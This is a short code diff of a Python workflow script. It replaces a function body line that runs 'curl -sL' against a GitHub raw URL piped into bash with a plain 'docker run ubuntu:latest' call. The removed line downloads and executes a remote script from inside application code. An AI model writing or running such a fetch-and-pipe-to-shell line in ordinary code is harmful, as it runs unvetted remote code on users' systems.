@@ -14,7 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
+  os.system('docker run ubuntu:latest')
 
 if __name__ == "__main__":
   app.start()
